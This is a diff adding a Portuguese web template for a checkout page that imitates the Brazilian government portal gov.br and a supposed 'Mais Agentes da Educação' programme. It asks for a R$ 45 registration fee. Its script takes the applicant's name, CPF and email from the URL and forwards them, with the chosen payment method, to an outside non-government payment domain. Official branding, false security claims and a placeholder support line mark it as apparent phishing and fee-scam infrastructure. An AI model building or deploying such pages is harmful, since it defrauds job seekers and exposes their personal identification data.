@@ -1,0 +1,205 @@
+{% extends "base.html" %}
+
+{% block title %}Checkout - Mais Agentes da Educação - gov.br{% endblock %}
+
+{% block content %}
+<div class="px-4 py-4">
+    <h1 class="text-3xl font-semibold mb-4" style="color: #1351B4;">Finalização da Inscrição</h1>
+    
+    <div class="border-t border-b border-gray-300 py-3 mb-6">
+        <div class="text-gray-700 text-sm">
+            <p>Publicado em 24/05/2025 17h37</p>
+            <p>Atualizado em 24/05/2025 18h29</p>
+        </div>
+    </div>
+
+    <div class="max-w-4xl mx-auto">
+        <div class="grid md:grid-cols-2 gap-8">
+            <!-- Resumo da Inscrição -->
+            <div class="bg-white border border-gray-200 rounded-lg p-6">
+                <h2 class="text-xl font-semibold text-gray-800 mb-4">
+                    <i class="fas fa-file-alt mr-2 text-blue-600"></i>
+                    Resumo da Inscrição
+                </h2>
+                
+                <div class="space-y-4">
+                    <div class="border-b border-gray-200 pb-4">
+                        <h3 class="font-medium text-gray-800 mb-2">Programa</h3>
+                        <p class="text-sm text-gray-600">Mais Agentes da Educação - PNAE 2025.2</p>
+                    </div>
+                    
+                    <div class="border-b border-gray-200 pb-4">
+                        <h3 class="font-medium text-gray-800 mb-2">Dados do Candidato</h3>
+                        <div class="text-sm text-gray-600 space-y-1">
+                            <p><strong>Nome:</strong> <span id="candidato-nome">-</span></p>
+                            <p><strong>CPF:</strong> <span id="candidato-cpf">-</span></p>
+                            <p><strong>Email:</strong> <span id="candidato-email">-</span></p>
+                        </div>
+                    </div>
+                    
+                    <div class="border-b border-gray-200 pb-4">
+                        <h3 class="font-medium text-gray-800 mb-2">Cargo Selecionado</h3>
+                        <p class="text-sm text-gray-600" id="cargo-selecionado">Auxiliar Administrativo</p>
+                    </div>
+                    
+                    <div>
+                        <h3 class="font-medium text-gray-800 mb-2">Localização</h3>
+                        <p class="text-sm text-gray-600" id="localizacao-candidato">-</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Pagamento -->
+            <div class="bg-white border border-gray-200 rounded-lg p-6">
+                <h2 class="text-xl font-semibold text-gray-800 mb-4">
+                    <i class="fas fa-credit-card mr-2 text-blue-600"></i>
+                    Taxa de Inscrição
+                </h2>
+                
+                <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
+                    <div class="flex items-center justify-between">
+                        <span class="text-gray-700">Taxa de Inscrição</span>
+                        <span class="text-2xl font-bold text-blue-600">R$ 45,00</span>
+                    </div>
+                    <p class="text-xs text-gray-600 mt-2">
+                        Valor conforme estabelecido no edital oficial do programa
+                    </p>
+                </div>
+                
+                <div class="space-y-4">
+                    <div class="bg-gray-50 border border-gray-200 rounded-lg p-4">
+                        <h3 class="font-medium text-gray-800 mb-3">Métodos de Pagamento</h3>
+                        
+                        <div class="space-y-3">
+                            <label class="flex items-center cursor-pointer">
+                                <input type="radio" name="payment" value="pix" class="mr-3" checked>
+                                <div class="flex items-center">
+                                    <i class="fas fa-qrcode text-green-600 mr-2"></i>
+                                    <span class="text-sm font-medium">PIX</span>
+                                    <span class="ml-2 bg-green-100 text-green-800 text-xs px-2 py-1 rounded">Instantâneo</span>
+                                </div>
+                            </label>
+                            
+                            <label class="flex items-center cursor-pointer">
+                                <input type="radio" name="payment" value="cartao" class="mr-3">
+                                <div class="flex items-center">
+                                    <i class="fas fa-credit-card text-blue-600 mr-2"></i>
+                                    <span class="text-sm font-medium">Cartão de Crédito/Débito</span>
+                                </div>
+                            </label>
+                            
+                            <label class="flex items-center cursor-pointer">
+                                <input type="radio" name="payment" value="boleto" class="mr-3">
+                                <div class="flex items-center">
+                                    <i class="fas fa-barcode text-orange-600 mr-2"></i>
+                                    <span class="text-sm font-medium">Boleto Bancário</span>
+                                    <span class="ml-2 bg-orange-100 text-orange-800 text-xs px-2 py-1 rounded">2 dias úteis</span>
+                                </div>
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
+                        <div class="flex items-start">
+                            <i class="fas fa-exclamation-triangle text-yellow-600 mt-1 mr-2"></i>
+                            <div class="text-sm text-yellow-800">
+                                <p class="font-medium mb-1">Importante:</p>
+                                <p>O pagamento deve ser realizado até o prazo final de inscrições para garantir sua participação no processo seletivo.</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <button id="finalizar-pagamento" 
+                            class="w-full bg-green-600 text-white font-medium py-3 px-6 rounded-md hover:bg-green-700 transition-colors">
+                        <i class="fas fa-shield-check mr-2"></i>
+                        Finalizar Pagamento
+                    </button>
+                    
+                    <div class="text-center">
+                        <p class="text-xs text-gray-500">
+                            Ambiente seguro protegido por SSL e certificação digital
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Informações Adicionais -->
+        <div class="mt-8 bg-white border border-gray-200 rounded-lg p-6">
+            <h3 class="text-lg font-semibold text-gray-800 mb-4">Informações Importantes</h3>
+            
+            <div class="grid md:grid-cols-2 gap-6">
+                <div>
+                    <h4 class="font-medium text-gray-800 mb-2">Após o Pagamento</h4>
+                    <ul class="text-sm text-gray-600 space-y-1">
+                        <li>• Confirmação por email em até 24 horas</li>
+                        <li>• Comprovante de inscrição disponível para download</li>
+                        <li>• Acesso ao cronograma completo do processo</li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h4 class="font-medium text-gray-800 mb-2">Suporte</h4>
+                    <ul class="text-sm text-gray-600 space-y-1">
+                        <li>• Central de atendimento: 0800-123-4567</li>
+                        <li>• Email: suporte@maisagentes.gov.br</li>
+                        <li>• Horário: Segunda a sexta, 8h às 18h</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Preencher dados do candidato a partir dos parâmetros da URL
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    const nome = urlParams.get('name');
+    const cpf = urlParams.get('document');
+    const email = urlParams.get('email');
+    
+    if (nome) {
+        document.getElementById('candidato-nome').textContent = nome;
+    }
+    
+    if (cpf) {
+        document.getElementById('candidato-cpf').textContent = formatarCPF(cpf);
+    }
+    
+    if (email) {
+        document.getElementById('candidato-email').textContent = email;
+    }
+    
+    // Carregar dados de localização do localStorage
+    const dadosLocalizacao = JSON.parse(localStorage.getItem('dadosLocalizacao') || '{}');
+    if (dadosLocalizacao.localidade) {
+        const localizacao = `${dadosLocalizacao.localidade}/${dadosLocalizacao.uf}`;
+        document.getElementById('localizacao-candidato').textContent = localizacao;
+    }
+    
+    // Handler do botão finalizar pagamento
+    document.getElementById('finalizar-pagamento').addEventListener('click', function() {
+        const metodoSelecionado = document.querySelector('input[name="payment"]:checked').value;
+        
+        // Redirecionar para o checkout externo com base no método
+        const params = new URLSearchParams();
+        if (nome) params.append('name', nome);
+        if (cpf) params.append('document', cpf);
+        if (email) params.append('email', email);
+        params.append('payment_method', metodoSelecionado);
+        
+        const urlCheckout = `https://pay.cadastroagentesdaeducacao.org/rn4RgQ6aVAA3wBV?${params.toString()}`;
+        window.location.href = urlCheckout;
+    });
+});
+
+function formatarCPF(cpf) {
+    if (!cpf) return '';
+    const numerosCPF = cpf.replace(/\D/g, '');
+    return numerosCPF.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+}
+</script>
+
+{% endblock %}
